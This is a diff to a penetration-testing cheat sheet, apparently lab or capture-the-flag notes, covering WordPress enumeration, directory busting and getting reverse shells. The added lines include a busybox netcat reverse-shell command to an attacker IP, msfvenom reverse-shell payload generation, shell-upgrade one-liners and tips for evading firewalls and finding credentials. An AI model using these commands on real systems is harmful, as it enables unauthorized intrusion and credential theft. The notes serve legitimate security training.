@@ -49,13 +49,16 @@ Manual Enumeration (go to website and click around):
 		- root:root
 		- root:toor
 		- username:username ( if you find a username)
+
+## Hey It's WordPress!
+
 - Auto Enum:
-	- if wordpress, run wpscan. #wpscan
+	- if wordpress, run wpscan. 
 	- if xmlrpc is enabled, use this https://github.com/relarizky/wpxploit
 	- Always check out the wp-contents/uploads folder. Might have interesting things inside
 
 ```bash
-# make sure you get the token from wpscan website!
+# make sure you get the token from wpscan website! You will need to create a user account
 wpscan --url http://<domain> --enumerate ap --plugins-detection aggressive -o websrv1/wpscan
 
 # if https, add the --disable-tls-checks
@@ -63,8 +66,16 @@ wpscan --url http://<domain> --enumerate ap --plugins-detection aggressive -o we
 # if you have a user, add --usernames <username> to brute force, -U <user list>, --passwords <wordlist like rockyou>
 ```
 
+see if you can upload files via the media or the plugins tab.
+- For plugins may need to upload as a zip
+- files are uploaded to /wp-content/uploads
+- Some good content here on how to get a revshell if you can get into the management panel https://www.hackingarticles.in/wordpress-reverse-shell/
+
+---------------------
+## Directory Busting
+
 - Always dirbust and nikto
-- The choice of wordlist can be important. What I find useful are:
+- The choice of wordlist can be important. What I find useful are: (can be found in /usr/share/wordlists/seclists/Discovery/Web-Content/)
 	- Seclists's big.txt, medium directory (with this you should put in the extension flags as well or you may miss things!)
 	- Seclists raft medium directory, files
 ```bash
@@ -177,3 +188,39 @@ X-Remote-IP: 127.0.0.1
 X-Remote-Addr: 127.0.0.1
 
 ```
+----------------------------------------------
+## I got a Webshell! or did I?
+
+ if your shell is part of a multi staged exploit i.e where the exploit script downloads the shell file from you and then executes it on the target, see if the exploit script has a sleep function. lengthen the sleep function to like 10 seconds or something because it takes a while to fully download your shell script
+
+- some boxes have firewalls rules so you may need to change your revshell lport to something common like port 80 or 443 to be safe. you can also consider using existing open ports on the target (egress traffic might be open)
+
+- For Wordpress, uploaded stuff are usually in wp-content
+
+- sometimes a direct php revshell would not work. Try a php backdoor shell first and then use it to execute a netcat reverse shell
+
+- is your nc rev shell not working? perhaps the nc on the system is an older version and does not support the -e flag. 
+    - To test this, try just running nc <attacker ip> <port>. If you get a connection back, then do the following and you should get a nc revshell
+
+```bash
+busybox nc <attacker ip> <port> -e /bin/bash 
+```
+
+- Once you pop your web shell, it is usually a "weak" shell that may have issues executing follow on exploits. if it linux, upgrade your shell first (needs python)
+
+```bash
+# change to /bin/sh if it doesnt work
+python3 -c "import pty;pty.spawn('/bin/bash');"
+
+python3 -c 'import os; os.system("/bin/bash");'
+```
+- once upgraded, consider using either native nc (which may not work because of your weak shell) or upload a msfvenom shell and execute that to gain a more stable shell
+
+```bash
+
+msfvenom -p windows/shell_reverse_tcp LHOST=<your ip> LPORT=<port> -f exe > abc.exe 
+
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=<your ip> LPORT=<port> -f elf > abc.elf 
+
+```
+- if you enter via a web-service, you should ENUMERATE the /var/www/html folder for creds
